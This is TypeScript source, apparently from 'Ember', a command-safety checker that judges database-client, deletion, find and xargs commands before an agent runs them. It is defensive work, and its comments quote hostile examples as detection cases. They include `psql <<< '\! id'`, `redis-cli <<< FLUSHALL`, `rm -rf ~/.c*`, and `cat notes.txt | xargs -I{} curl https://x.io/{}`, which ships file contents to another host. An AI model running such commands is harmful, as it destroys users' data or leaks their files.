 * takes any backslash outside quotes as one, straight after SQL too (`select 1\g out.txt`, `select 'x'\gexec`:
 * commands-remote-x7-7); one after a blank or `;` counts whatever the quotes around it seem to be, since Ember's
 * reading of them is only a guess (`E'…\'…'`, `$$…$$`).
 */
function psqlCommands(t: string): { name: string; rest: string }[] {
  const out = new Map<number, { name: string; rest: string }>();
  const command = /\\([A-Za-z!?][\w!?+]*)[ \t]*([^\n\\]*)/y;
  const take = (at: number): number => {
    command.lastIndex = at;
    const m = command.exec(t);
    if (!m) return at;
    out.set(at, { name: m[1], rest: m[2] });
    return at + m[0].length - 1;
  };
  for (const m of t.matchAll(/(?:^|[\s;])(?=\\[A-Za-z!?])/g)) take(m.index + m[0].length);
  // A comment, a dollar-quoted string or an escaped quote can hold a quote that pairs with nothing: then every backslash
  // counts, in quotes or not (commands-remote-y7-4).
  const guess = /--|\/\*|\$\w*\$|\\['"]/.test(t);
  let quote: string | null = null;
  for (let k = 0; k < t.length; k++) {
    const c = t[k];
    if (quote !== null && !guess) { if (c === quote) quote = null; } else if (c === "'" || c === "\"") quote = c; else if (c === "\\") k = take(k);
  }
  return [...out.entries()].sort((a, b) => a[0] - b[0]).map(e => e[1]);
}

/**
 * A database client's own commands in its text (commands-remote-c7-1): any that isn't on its short list of ones that
 * only show things asks, and the shell command or the files it names are judged, so Ember's own are refused.
 */
function clientCommands(h: H, client: SqlClient, t: string): void {
  if (client === "sqlite") {
    for (const line of t.split("\n")) {
      const m = /^\s*\.([A-Za-z]\w*)[ \t]*(.*)$/.exec(line);
      if (!m || SQLITE_SHOWS.has(m[1].toLowerCase())) continue;
      const name = m[1].toLowerCase();
      if ("shell".startsWith(name) || "system".startsWith(name)) clientShell(h, m[2]);
      else clientWords(h, m[2]);
    }
    if (SQLITE_FUNCTIONS.test(t)) h.e.unclear("unclear.sql", SAYS_CLIENT);
  } else if (client === "psql") {
    for (const m of psqlCommands(t)) {
      // A backquoted word in any of them runs a program.
      if (PSQL_SHOWS.test(m.name) && !m.rest.includes("`")) continue;
      if (m.name === "!") clientShell(h, m.rest);
      else clientWords(h, m.rest);
    }
  } else {
    // A client word starts a statement: after `;`, or on a line of its own (`use app` ends at its line: x7-7).
    for (const m of t.matchAll(/(?:^|;)\s*(source|tee|pager|edit|system)\b[ \t]*([^;\n]*)|\\([.!TPe])[ \t]*([^;\n\\]*)/gim)) {
      const word = (m[1] ?? "").toLowerCase();
      const rest = m[2] ?? m[4] ?? "";
      if (word === "system" || word === "pager" || m[3] === "!" || m[3] === "P") clientShell(h, rest);
      else clientWords(h, rest, word === "source" || m[3] === "." ? "read" : "write");
    }
  }
}

/** A database client's own text: changing data is class a; running programs or touching files from it is unclear. */
function databaseText(h: H, texts: (string | null)[], client?: SqlClient): void {
  for (const t of texts) {
    if (t === null) { h.e.unclear("unclear.sql", "It runs database commands Ember can't see."); continue; }
    if (SQL_ESCAPE.test(t)) h.e.unclear("unclear.sql", SAYS_CLIENT);
    if (client) clientCommands(h, client, t);
    if (SQL_WRITE.test(t)) h.e.add("destroy", "db.change", "Changes or deletes data in a database.");
  }
}

reg(NATIVE, ["psql", "sqlite3", "sqlite", "duckdb", "sqlcmd", "cqlsh", "clickhouse-client", "mongo", "mongosh", "redis-cli", "sqlplus"], h => {
  if (INTERACTIVE.has(h.key)) interactive(h);
  const k = h.key;
  if (k === "psql") {
    databaseText(h, [...inlineSql(h, ["c"], ["command"]), ...clusterSql(h, "c")], "psql");
    // The file its results go to (-o, or a program after `|`) and the one it logs every query to (-L), judged as
    // files it writes (commands-remote-c7-1).
    const p = opts(h, { shortValue: "cdfFhLopPRTUv", longValue: ["command", "dbname", "file", "field-separator", "host", "log-file", "output", "port", "pset", "record-separator", "table-attr", "username", "set", "variable"] });
    for (const o of p.opts) {
      if (o.value === undefined) continue;
      const a: Arg = o.value === null ? { v: null, raw: "?", glob: false, ...(o.parts ? { parts: o.parts } : {}) } : lit(o.value);
      if (optIs(o.name, "o") || optIs(o.name, "output")) {
        if (o.value !== null && o.value.trim().startsWith("|")) clientShell(h, o.value.trim().slice(1));
        else overwrites(h, a);
      } else if (optIs(o.name, "L") || optIs(o.name, "log-file")) h.e.usePath(a, "write", h.sc);
    }
    // SQL read from stdin or a here-document (`psql <<< '\! id'`, `psql -f - <<< …`): judge the seen text, else ask;
    // a file given as another descriptor (`-f /dev/fd/3`) can't be read first (review #166).
    const files = inlineSql(h, ["f"], ["file"]);
    if (files.some(f => f !== null && STDIN_NAME.test(f)) || (!inlineSql(h, ["c"], ["command"]).length && !files.length)) sqlFromStdin(h, "psql");
    if (files.some(f => f !== null && !STDIN_NAME.test(f) && STREAM_NAME.test(f))) h.e.unclear("unclear.script-stream", SAYS.scriptStream);
    // A SQL script this task downloaded, run with -f, is download-and-run (its `\!`, `COPY … FROM PROGRAM` run code):
    // commands-remote-r8-2.
    if (files.some(f => f !== null && !STDIN_NAME.test(f) && !STREAM_NAME.test(f) && h.e.isDownloaded(lit(f), h.sc))) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
  }
  else if (k === "sqlcmd") databaseText(h, inlineSql(h, ["Q", "q"], []));
  else if (k === "cqlsh") databaseText(h, inlineSql(h, ["e"], ["execute"]));
  else if (k === "clickhouse-client") databaseText(h, inlineSql(h, ["q"], ["query"]));
  else if (k === "sqlite3" || k === "sqlite" || k === "duckdb") {
    // -cmd's and -init's values are not the database or its SQL.
    const ops = h.args.filter((a, j) => !isOption(a) && !/^--?(cmd|init)$/.test(h.args[j - 1]?.v ?? ""));
    // duckdb's -c and -s take the text to run, with a database named or not (commands-remote-x7-7).
    const given = k === "duckdb" ? h.args.flatMap((a, j) => (/^--?[cs]$/.test(a.v ?? "") ? [h.args[j + 1]?.v ?? null] : [])) : [];
    databaseText(h, [...ops.slice(1).map(a => a.v), ...given, ...inlineSql(h, [], ["cmd"]).map(x => x), ...h.args.flatMap((a, j) => (a.v === "-cmd" ? [h.args[j + 1]?.v ?? null] : []))], "sqlite");
    // -init FILE runs the file's commands first, as `.read FILE` does (review #166): stdin is judged as below, another
    // descriptor can't be read first, and any other file asks.
    const init = h.args.flatMap((a, j) => (/^--?init$/.test(a.v ?? "") ? [h.args[j + 1]?.v ?? null] : []));
    for (const f of init) {
      if (f !== null && STDIN_NAME.test(f)) sqlFromStdin(h, "sqlite");
      else if (f !== null && STREAM_NAME.test(f)) h.e.unclear("unclear.script-stream", SAYS.scriptStream);
      else {
        if (f) h.e.usePath(lit(f), "read", h.sc);
        h.e.unclear("unclear.sql", "It runs database client commands from a file Ember doesn't read.");
      }
    }
    // SQL read from stdin or a here-document (`sqlite3 <<< '.shell id'`): judge the seen text, else ask (review #166).
    if (ops.length < 2 && !inlineSql(h, [], ["cmd"]).length && !h.args.some(a => a.v === "-cmd") && !init.some(f => f !== null && STDIN_NAME.test(f))) sqlFromStdin(h, "sqlite");
    if (ops[0]) h.e.readArgs([ops[0]], h.sc);
    return;
  } else if (k === "mongo" || k === "mongosh") {
    if (inlineSql(h, [], ["eval"]).length) h.e.unclear("unclear.inline-code", "It runs code given on the command line.");
    // JavaScript read from its input (`echo 'db.dropDatabase()' | mongosh`, `curl … | mongosh`): code Ember can't
    // follow, so it asks, saying when it changes data; after a fetch it is download-and-run (commands-remote-c5-3).
    if (h.s.stdin === "pipe" || h.s.stdin === "heredoc") {
      fromStdin(h, t => {
        databaseText(h, [t]);
        h.e.unclear("unclear.stdin-code", "It runs code from its input that Ember can't follow.");
      });
    } else if (h.s.stdin === "file") stdinFile(h);
    // A script file it runs (`mongosh app drop_all.js`), as an interpreter's is.
    for (const a of h.args) if (a.v !== null && !isOption(a) && /\.(c|m)?js$/i.test(a.v)) runScript(h, a);
  } else if (k === "redis-cli") {
    // -c (cluster mode), -x, -e and --tls take no value (commands-remote-c4-3).
    const now: OptSpec = { shortValue: "hpsanuirdD", longValue: ["user", "pass", "sni", "cacert", "cacertdir", "cert", "key", "tls-ciphers", "tls-ciphersuites", "show-pushes", "lru-test", "rdb", "functions-rdb", "pipe-timeout", "memkeys-samples", "pattern", "quoted-pattern", "intrinsic-latency", "eval"] };
    // Main's table gave -c and --tls the next word and knew no --sni, --cacertdir or --show-pushes, so the command behind
    // one of them was another word, which changed the data for all it knew: judged that way too (commands-held-3).
    const was: OptSpec = { shortValue: "hpsanuirdc", longValue: ["user", "pass", "tls", "cacert", "cert", "key", "rdb", "functions-rdb", "eval"] };
    const spec = h.e.tableInUse(now, was);
    const p = heldOpts(h, now, was);
    // The files its options name: --rdb and --functions-rdb write a dump there; the TLS files and --eval's script are
    // read (commands-z6-2).
    const files = { write: ["rdb", "functions-rdb"], read: ["cacert", "cacertdir", "cert", "key", "eval"] };
    optionFiles(h, h.args, p, files);
    if (values(p, "eval").length || has(p, "eval")) h.e.unclear("unclear.inline-code", "It runs code given on the command line.");
    if (has(p, "a", "pass") || values(p, "a").length) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
    // A command word Ember can't see all of (`redis-cli "$c"`): each value the text gives it, split as the shell may,
    // and the files that options split out of it name judged as written out, never making it run (commands-z6-2).
    const [word, ...rest] = p.operands;
    if (word?.v === null) {
      for (const f of h.e.knownForms(word)) {
        redisCommand(h, f === null ? [null] : [...f.trim().split(/\s+/), ...rest.map(a => a.v)]);
        const split = f === null ? [] : [...f.split(/\s+/).filter(w => w !== "").map(w => lit(w)), ...rest];
        if (split.length) optionFiles(h, split, parseOpts(split, spec), files);
      }
    } else redisCommand(h, p.operands.map(a => a.v));
    // With no command on its line it runs the commands its input gives, one a line (`redis-cli <<< FLUSHALL`, `echo
    // DEL x | redis-cli`); with -x its input is the last argument's value (commands-remote-c5-3).
    if (p.operands.length === 0 && !has(p, "x")) {
      if (h.s.stdin === "pipe" || h.s.stdin === "heredoc") fromStdin(h, t => { for (const l of t.split("\n")) redisCommand(h, l.trim().split(/\s+/)); }, false);
      else if (h.s.stdin === "file") stdinFile(h);
    }
  }
  for (const f of [...inlineSql(h, ["f"], ["file"]), ...inlineSql(h, ["i"], ["input-file"])]) if (f) { h.e.usePath(lit(f), "read", h.sc); nameCheck(h, f); }
});

/**
 * Deleters that had no row before commands-remote-c8-2 and so ran as unknown programs, whatever they were given: what
 * generic() judged of them (an operand Ember can't see, one that names a program, a broad folder) is still judged first,
 * and the deletion is added on top, so none decides less safely than it did.
 */
const NEW_DELETERS = new Set([
  "grm", "grmdir", "gunlink", "gshred", "scrub", "rimraf", "del", "del-cli", "gvfs-rm", "gvfs-trash", "rmtrash", "trash-rm", "fdupes", "jdupes",
  "bfg", "git-filter-repo",
]);
/** Programs with a row now that keep an unknown program's reading of `-o` and its like (optionPaths), as before it. */
const UNKNOWN_OPTIONS = new Set([...NEW_DELETERS, "toybox"]);
const asBefore = (h: H): void => {
  if (!NEW_DELETERS.has(h.key)) return;
  // A PowerShell word shaped like a cmdlet's name (`del-cli`, `gvfs-rm`) was an unknown cmdlet's, which asked.
  if (h.sc.family === "powershell" && /^[a-z]+-[a-z0-9]+$/.test(h.key)) unknownCmdlet(h);
  else generic(h, true);
};

// a: rm and friends (§3.5.1); GNU coreutils' own as Homebrew names them on a Mac (grm, gshred…), and scrub, which
// overwrites a file (its -r removes it too: commands-remote-c8-2).
reg(NATIVE, ["rm", "unlink", "shred", "srm", "wipe", "rmdir", "grm", "grmdir", "gunlink", "gshred", "scrub"], h => {
  asBefore(h);
  const key = h.key.replace(/^g(?=(rm|rmdir|unlink|shred)$)/, "");
  const shred = key === "shred";
  // shred's -u (remove) takes no value, and --remove only one after = (commands-remote-r4-2); scrub's -p, -b, -s and -D
  // take one.
  const spec: OptSpec = { shortValue: shred ? "ns" : key === "scrub" ? "pbsD" : "", longValue: shred ? ["iterations", "size", "random-source"] : key === "scrub" ? ["pattern", "blocksize", "device-size", "dirent"] : [], longOptional: ["remove"] };
  // Main's table gave shred's -u the next word, so the file after the option it swallowed (`shred -u -n <file>`) was
  // shredded: judged that way too. The names main had no row for were judged as unknown programs (asBefore) and have
  // no table to be held to (commands-held-9).
  const p = heldOpts(h, spec, NEW_DELETERS.has(h.key) ? spec : { shortValue: h.key === "shred" ? "nsu" : "", longValue: h.key === "shred" ? ["iterations", "size", "random-source"] : [] });
  const rec = (key === "rm" || key === "srm" || key === "wipe") && has(p, "r", "R", "recursive");
  const objs = objsOf(h, p.operands, rec ? "deleteTree" : "delete");
  const widening: string[] = [];
  if (rec) widening.push("recursive");
  if (has(p, "no-preserve-root")) widening.push("--no-preserve-root");
  if (key === "rmdir" && has(p, "p", "parents")) widening.push("--parents");
  const list = listOf(objs);
  h.e.add("destroy", `posix.${key}`, starDeletes(h, objs, rec) ?? (rec ? `Deletes ${list} and everything in ${objs.length > 1 ? "them" : "it"}.` : `Deletes ${list}.`), { objects: objs, widening });
  if (objs.some(o => o.abs !== null && /\/\.local\/share\/Trash(\/|$)/.test(o.abs))) h.e.add("destroy", "trash.empty", "Empties the trash.");
});

/**
 * The words a pattern's brace groups and extglob groups stand for, with the braces read as a shell reads them
 * (braceGroup: `{a,b}`, `{1..3}`; `+(a|b)`, `@(…)`; `?(…)` and `*(…)` may be empty; `!(…)` is anything, `*`), or null
 * past MAX_SIMPLE of them (commands-remote-x8-8). What is left may still hold `*`, `?` or `[…]`. A `{` with a comma
 * after it that never closes is null too: the matcher reads it as a letter and expands a group after it
 * (`'{,/../{..,x}'` is `{,/../..`), which braceGroup doesn't find. rimraf's matcher (minimatch) reads some braces
 * otherwise, a stray `}` before a later comma (`'{a},..,b}'` is `a}`, `..`, `b`) or a `\` in a group (`'{.\.,x}'` is
 * `..`), and del-cli's isn't checked: those patterns only ask, as before (commands-remote-y8-1).
 */
function patternWords(s: string): string[] | null {
  const out: string[] = [];
  const go = (w: string): boolean => {
    const g = braceGroup(w);
    if (g === "partial") return false;
    if (g !== null) return g.alts.every(alt => go(w.slice(0, g.from) + alt + w.slice(g.to + 1)));
    const m = /([?*+@!])\(([^()]*)\)/.exec(w);
    if (m) {
      const alts = m[1] === "!" ? ["*"] : [...m[2].split("|"), ...(m[1] === "?" || m[1] === "*" ? [""] : [])];
      return alts.every(alt => go(w.slice(0, m.index) + alt + w.slice(m.index + m[0].length)));
    }
    out.push(w);
    return out.length <= MAX_SIMPLE;
  };
  return go(s) ? out : null;
}

/**
 * rimraf and del-cli (`del`), which a JavaScript project's scripts reach for: they delete each folder and all that is in
 * it, and expand a pattern themselves, quoted or not (rimraf unless `-G`/`--no-glob`; del-cli always), so a word that
 * holds one is judged as a pattern and the step is never announced (commands-remote-c8-2).
 */
reg(NATIVE, ["rimraf", "del", "del-cli"], h => {
  asBefore(h);
  const p = opts(h, { longValue: ["impl"] });
  if (p.operands.length === 0) return;
  const globs = h.key !== "rimraf" || !has(p, "G", "no-glob");
  const widening = ["recursive"];
  const objs = p.operands.filter(a => !(h.key !== "rimraf" && a.v?.startsWith("!"))).map(a => {
    if (!globs || a.v === null || a.glob || !/[*?[\]{}()!]/.test(a.v)) return h.e.usePath(a, "deleteTree", h.sc);
    if (!widening.includes("pattern")) widening.push("pattern");
    // Braces and extglob's `+(…)`, `@(…)`, `!(…)`, which the pattern matcher doesn't read, may match anything in the
    // folder before them: one that holds Ember's files, or is one, is refused as `rm -rf ~/.c*` is.
    if (/[{}()]/.test(a.v) && h.sc.cwd !== null) {
      const segs = a.v.split("/");
      const k = segs.findIndex(x => /[*?[\]{}()!+@]/.test(x));
      const fixed = resolveTargetPath(k <= 0 ? (a.v.startsWith("/") ? "/" : ".") : segs.slice(0, k).join("/") || "/", { os: h.sc.os, home: h.sc.home ?? "", cwd: h.sc.cwd });
      if (isEmberPath(fixed, h.sc.path) || holdsEmberPath(fixed, h.sc.path)) h.e.refuseWith("ember.path", "safety");
      // Each word the groups stand for is judged as an operand of its own (`'{..,x}'` is `..`, `'{/home/ana,x}'` the
      // home folder: commands-remote-x8-8); past MAX_SIMPLE of them Ember can't tell what the pattern reaches.
      const alts = patternWords(a.v);
      if (alts === null) h.e.refuseWith("ember.path", "safety");
      else for (const x of alts) if (x !== a.v) h.e.usePath(/[*?[]/.test(x) ? { ...a, v: x, glob: true, pattern: x } : { ...a, v: x, glob: false, pattern: undefined }, "deleteTree", h.sc);
    }
    return h.e.usePath({ ...a, glob: true, pattern: a.v }, "deleteTree", h.sc);
  });
  if (has(p, "no-preserve-root")) widening.push("--no-preserve-root");
  h.e.add("destroy", "posix.rm", starDeletes(h, objs, true) ?? `Deletes ${listOf(objs)} and everything in ${objs.length > 1 ? "them" : "it"}.`, { objects: objs, widening });
});

/** fdupes and jdupes delete every copy of a duplicate but one with `-d`, and jdupes replaces copies with links (-L, -B). */
reg(NATIVE, ["fdupes", "jdupes"], h => {
  asBefore(h);
  const p = opts(h, { shortValue: h.key === "fdupes" ? "oGxl" : "oXyCPU", longValue: ["order", "minsize", "maxsize", "log", "exclude", "chunk-size", "ext-filter", "ext-option", "print"] });
  const replaces = h.key === "jdupes" && has(p, "L", "B", "l", "link-hard", "link-soft", "dedupe");
  if (!has(p, "d", "delete") && !replaces) return;
  const objs = objsOf(h, p.operands, "delete");
  h.e.add("destroy", `posix.${h.key}`, replaces ? `Replaces duplicate files in ${listOf(objs)}.` : `Deletes duplicate files in ${listOf(objs)}.`, { objects: objs });
});

/** BFG and git-filter-repo rewrite a repository's history (as `git filter-repo` does), unless only asked to report. */
reg(NATIVE, ["bfg", "git-filter-repo"], h => {
  asBefore(h);
  if (h.args.length === 0 || h.args.every(a => /^(-h|--help|--version|--analyze|--dry-run)$/.test(a.v ?? ""))) return;
  h.e.add("destroy", "git.history", "Deletes history git keeps for recovery.", { program: h.key });
});

reg(NATIVE, ["trash-empty"], h => { h.e.add("destroy", "trash.empty", "Empties the trash."); });
// trash-rm deletes what matches its pattern from the trash for good (commands-remote-c8-2).
reg(NATIVE, ["trash-rm"], h => { asBefore(h); h.e.add("destroy", "trash.empty", "Deletes files in the trash for good."); });
reg(NATIVE, ["trash", "trash-put", "gio", "gvfs-trash", "gvfs-rm", "rmtrash"], h => {
  asBefore(h);
  if (h.key === "gio") {
    const sub = lower(h.args[0]);
    const rest = h.args.slice(1);
    if (sub === "trash" && rest.some(a => a.v === "--empty")) { h.e.add("destroy", "trash.empty", "Empties the trash."); return; }
    if (sub === "open") { h.args = rest; launcher(h); return; }
    if (sub === "trash" || sub === "remove" || sub === "rm") {
      const objs = objsOf(h, rest.filter(a => !isOption(a)), "delete");
      h.e.add("destroy", "posix.rm", `Deletes ${listOf(objs)}.`, { objects: objs });
      return;
    }
    if (sub === "copy" || sub === "move" || sub === "rename" || sub === "save") { copyLike({ ...h, args: rest }, sub === "move" ? "mv" : "cp"); return; }
    // A launcher marked trusted runs without the desktop's warning (review #172).
    const trusted = rest.findIndex(a => lower(a) === "metadata::trusted");
    if (sub === "set" && trusted >= 0 && !/^(false|no|0)$/i.test(rest[trusted + 1]?.v ?? "")) h.e.add("system", "system.security", "Turns off or weakens a security protection.");
    h.e.readArgs(rest, h.sc);
    return;
  }
  const objs = objsOf(h, h.args.filter(a => !isOption(a)), "delete");
  h.e.add("destroy", "posix.rm", `Deletes ${listOf(objs)}.`, { objects: objs });
});

// Launcher entries (review #172): desktop-file-install copies them into --dir (by default the system's applications
// folder), desktop-file-edit changes one in place, and update-desktop-database writes the folder's file-type list.
reg(NATIVE, ["desktop-file-install", "desktop-file-edit", "update-desktop-database"], h => {
  const p = opts(h, {
    shortValue: "m",
    longValue: [
      "dir", "mode", "vendor", "set-key", "set-value", "set-name", "set-generic-name", "set-comment", "set-icon", "remove-key",
      "add-category", "remove-category", "add-mime-type", "remove-mime-type", "add-only-show-in", "remove-only-show-in",
      "add-not-show-in", "remove-not-show-in",
    ],
  });
  if (h.key === "desktop-file-edit") { objsOf(h, p.operands, "write"); return; }
  if (h.key === "update-desktop-database") {
    for (const d of p.operands.length ? p.operands : [lit("/usr/share/applications")]) {
      if (d.v === null) h.e.unclear("unclear.unresolved-arg", "Ember can't tell which folder this changes.");
      else h.e.usePath(lit(`${d.v.replace(/[\\/]+$/, "")}/mimeinfo.cache`), "write", h.sc);
    }
    return;
  }
  const dir = values(p, "dir").pop() ?? "/usr/share/applications";
  if (dir === null) { h.e.unclear("unclear.unresolved-arg", "Ember can't tell which folder this changes."); return; }
  for (const f of p.operands) {
    h.e.usePath(f, has(p, "delete-original") ? "move" : "read", h.sc);
    const name = f.v === null ? null : baseName(f.v, h.sc.path.flavour);
    if (name) h.e.usePath(lit(`${dir.replace(/[\\/]+$/, "")}/${name}`), "write", h.sc);
    else writeInto(h, dir);
  }
});

// find: deletes, writes, payloads, secret searches (§3.4.5, §3.5.1, critique security-5).
const FIND_VALUE = new Set([
  "-name", "-iname", "-path", "-ipath", "-wholename", "-iwholename", "-regex", "-iregex", "-lname", "-ilname", "-type", "-xtype",
  "-user", "-group", "-uid", "-gid", "-perm", "-size", "-mtime", "-atime", "-ctime", "-mmin", "-amin", "-cmin", "-newer", "-anewer",
  "-cnewer", "-maxdepth", "-mindepth", "-printf", "-fstype", "-inum", "-samefile", "-links", "-used", "-context", "-regextype",
  "-files0-from", "-D", "-newerat", "-newerct", "-newermt", "-newerma", "-newerBt",
]);
reg(NATIVE, ["find"], h => {
  if (h.sc.os === "win32" || h.sc.family !== "posix") { h.e.readArgs(h.args.filter(a => !(a.v ?? "").startsWith("/")), h.sc); return; }
  const a = h.args;
  let k = 0;
  while (k < a.length && a[k].v !== null && /^-(H|L|P|O\d*)$/.test(a[k].v!)) k++;
  if (a[k]?.v === "-D") k += 2;
  const starts: Arg[] = [];
  while (k < a.length && !(a[k].v !== null && (/^[-(!,]/.test(a[k].v!) || a[k].v === ")"))) starts.push(a[k++]);
  const expr = a.slice(k);
  const hasDelete = expr.some(x => x.v === "-delete");
  const startUse: PathUse = hasDelete ? "deleteTree" : "list";
  const startObjs = starts.length ? objsOf(h, starts, startUse) : [h.e.usePath(lit("."), startUse, h.sc)];
  const where = listOf(startObjs, "the current folder");
  let action = false;
  const patterns: string[] = [];
  for (let j = 0; j < expr.length; j++) {
    const v = expr[j].v;
    if (v === null) continue;
    if (/^-(exec|execdir|ok|okdir)$/.test(v)) {
      action = true;
      const payload: Arg[] = [];
      let end = j + 1;
      for (; end < expr.length; end++) {
        const pv = expr[end].v;
        if (pv === ";" || pv === "+" || pv === "\\;") break;
        payload.push(pv !== null && pv.includes("{}") ? { v: null, raw: expr[end].raw, glob: false } : expr[end]);
      }
      if (end >= expr.length) h.e.unclear("unclear.find-exec", "Ember can't tell where find's command ends.");
      const before = h.e.findings.length;
      h.e.payload(payload, h.sc, `find ${v}`);
      if (h.e.findings.slice(before).some(f => f.cls === "destroy")) {
        h.e.add("destroy", "posix.find.delete", `Deletes what it finds under ${where}.`, { objects: startObjs });
      }
      j = end;
      continue;
    }
    if (v === "-delete") { action = true; continue; }
    if (/^-f(print0?|printf|ls)$/.test(v)) {
      action = true;
      const out = expr[j + 1];
      if (out) {
        const obj = h.e.usePath(out, "write", h.sc);
        h.e.add("destroy", "posix.find.write", `Overwrites ${obj.text} if it exists.`, obj.abs ? { objects: [obj], ifExists: obj.abs } : { objects: [obj] });
      }
      j += v === "-fprintf" ? 2 : 1;
      continue;
    }
    if (/^-(print0?|printf|ls)$/.test(v)) action = true;
    if (/^-(i?name|i?path|i?wholename|i?regex|i?lname)$/.test(v)) { const pv = expr[j + 1]?.v; if (pv) patterns.push(pv); j++; continue; }
    // The starting points read from a file, whose names find shows in its errors (review #174).
    if (v === "-files0-from") { const f = expr[j + 1]; if (f && f.v !== null && !STDIN_NAME.test(f.v)) h.e.usePath(f, "read", h.sc); j++; continue; }
    if (FIND_VALUE.has(v) || /^-newer[aBcm][aBcmt]$/.test(v)) j++;
  }
  if (hasDelete) h.e.add("destroy", "posix.find.delete", `Deletes what it finds under ${where}.`, { objects: startObjs });
  // A find for secrets with an action that reads or lists them (the default action prints).
  const implicit = !expr.some(x => x.v !== null && /^-(exec|execdir|ok|okdir|delete|print0?|printf|ls|fprint0?|fprintf|fls|quit)$/.test(x.v));
  if ((action || implicit) && startObjs.some(o => o.abs !== null && secretKind(o.abs, "read", h.sc.path) !== null)) {
    h.e.add("secret", "path.secret", `Reads or changes passwords, keys or other secrets (${where}).`, { objects: startObjs });
  }
  if ((action || implicit) && patterns.some(pt => secretPattern(pt, h.sc))) {
    h.e.add("secret", "path.secret", `Reads or changes passwords, keys or other secrets (${patterns.join(", ")}).`);
  }
});
/** Whether a find -name/-path pattern can match a secret file's name or path. */
function secretPattern(pt: string, sc: Scope): boolean {
  const re = globRegExp(pt, sc.path, false);
  const reBase = globRegExp(pt.split("/").pop() ?? pt, sc.path, false);
  return SECRET_SAMPLE_NAMES.some(n => reBase.test(n)) || secretCandidates(sc.path).some(c => re.test(c) || reBase.test(baseName(c, sc.path.flavour)));
}

// xargs and parallel: their payload is a command too (§3.4.5).
reg(NATIVE, ["xargs"], h => {
  // GNU's -l, -i and -e (and --max-lines, --replace, --eof) take a value only attached or after =: written alone, the
  // next word is the command (commands-remote-c4-1). BSD's -J, -R and -S take one.
  const p = parseOpts(h.args, {
    shortValue: "adEILnPsJRS", shortOptional: "lie", longValue: ["arg-file", "delimiter", "max-args", "max-procs", "max-chars", "process-slot-var"],
    longOptional: ["eof", "replace", "max-lines"], stopAtOperand: true, jobCounts: ["P", "max-procs"],
  });
  // The file it reads its input from, a variable in it judged for Ember's own refusal (commands-remote-v5-2).
  optionFiles(h, h.args, p, { read: ["a", "arg-file"] }, false);
  // A bare -i or --replace replaces {}.
  const repl = values(p, "I", "replace", "i", "J")[0] ?? (has(p, "i", "replace") ? "{}" : undefined);
  const ops = p.operands.length ? p.operands : [lit("echo")];
  // Input Ember can't see put inside a longer word of a program that sends leaves the computer in its address or a
  // header (`cat notes.txt | xargs -I{} curl https://x.io/{}`: commands-classes-y9-6); a list of addresses fetched
  // one by one (`xargs -I{} curl -O {}`) is as before.
  if (repl && typeof h.s.stdinText !== "string" && ops[0].v !== null && FETCHERS.has(programName(ops[0].v, { os: h.sc.os, family: h.sc.family, wsl: h.sc.wsl, mountRoot: h.sc.mountRoot }).key)
    && ops.slice(1).some(a => a.v !== null && a.v !== repl && a.v.includes(repl))) h.e.add("publish", "send.contents", "May send what a file or a command holds to another computer.");
  // A here-string whose variables Ember follows (`xargs rm -rf <<< "$d"`): its pieces stand where the input goes, so the
  // command judges the variable's values as it uses them (commands-remote-w5-5).
  const fed = values(p, "a", "arg-file").length ? undefined : h.s.stdinVars?.word?.parts;
  // Input Ember sees whole (a here-string, a here-document, what echo or printf prints) with no quotes or backslashes
  // for xargs to read.
  const text = h.s.stdinText;
  const seen = typeof text === "string" && !/['"\\]/.test(text) && !values(p, "a", "arg-file", "d", "delimiter").length && !has(p, "0", "null") ? text : null;
  // The command as main read it (its options, and input it never saw), judged apart: where that asks, this asks, so no
  // way of writing an option decides less safely than it did (`xargs -l chmod +x`, `xargs -i npm`: commands-remote-x7-5);
  // a job count is the one thing read as now.
  const onMain = h.e.foundApart(() => {
    const m = parseOpts(h.args, {
      shortValue: "adEILlnPs", longValue: ["arg-file", "delimiter", "eof", "replace", "max-lines", "max-args", "max-procs", "max-chars", "process-slot-var"], stopAtOperand: true,
      jobCounts: ["P", "max-procs"],
    });
    const was = xargsUnseen(m.operands.length ? m.operands : [lit("echo")], values(m, "I", "replace", "i")[0] ?? undefined, undefined);
    if (was.intoCode) h.e.unclear("unclear.input-in-code", "It puts its input into shell text, where it can run as code.");
    h.e.payload(was.words, h.sc, "xargs", { stdin: null });
  });
  const from = h.e.findings.length;
  const judge = (repl: string | undefined): void => {
    const { words: unseen, intoCode } = xargsUnseen(ops, repl, fed);
    if (intoCode) h.e.unclear("unclear.input-in-code", "It puts its input into shell text, where it can run as code.");
    // The commands xargs builds from input Ember sees (commands-remote-v4-4), one per batch (commands-remote-r7-1).
    // Where it can't tell the batches (-x, -s, -E, a count that is no number), what it read is still judged, as one
    // command or with a placeholder line by line, as before it read batches (commands-remote-x7-1).
    const built = seen === null || intoCode ? null : xargsBuilds(p, seen, repl, ops) ?? xargsWhole(seen, repl, ops);
    if (built === null) { h.e.payload(unseen, h.sc, "xargs", { stdin: null }); return; }
    // Never decided less safely than with input Ember can't see, which is how these forms were judged before Ember read
    // what is printed: where that asks, what Ember read asks too, in its own words (commands-remote-r7-2).
    // The danger that reading named (a secret printed, a system change) stays on the card (heldTo, commands-held-7).
    const unread = h.e.foundApart(() => h.e.payload(unseen, h.sc, "xargs", { stdin: null }));
    const before = h.e.findings.length;
    for (const b of built) h.e.payload(b, h.sc, "xargs", { stdin: null });
    // More lines for a placeholder than Ember judges one by one: the rest are unread, so it asks (commands-remote-y7-3).
    const cut = repl !== undefined && seen !== null && seen.split("\n").filter(l => l.trim() !== "").length > MAX_FORMS;
    if (unread.length) h.e.heldTo(unread, before, "unclear.xargs-input", "xargs builds this command from its input.");
    else if (cut) h.e.asksAtLeast(before, "unclear.xargs-input", "xargs builds this command from its input.");
  };
  judge(repl);
  // GNU's xargs takes the last of -I (or -i) and -L, -l or -n and ignores the others, so with both written the input
  // may be added in batches after all (`xargs -I{} -L1 git` runs git with each line's words): judged that way too
  // (commands-remote-x7-3).
  if (repl !== undefined && has(p, "n", "max-args", "L", "l", "max-lines")) judge(undefined);
  h.e.heldTo(onMain, from, "unclear.xargs-input", "xargs builds this command from its input.");
});

/**
 * xargs's command with input Ember can't see standing as one unknown word: with a placeholder where it is, otherwise
 * after the words. The input put into shell text (`sh -c 'rm {}'`) is still read, the input standing as an unknown
 * word, and it is unclear (a name holding `;` or `$(…)` runs as code): intoCode.
 */
function xargsUnseen(ops: readonly Arg[], repl: string | undefined, fed: Arg["parts"]): { words: Arg[]; intoCode: boolean } {
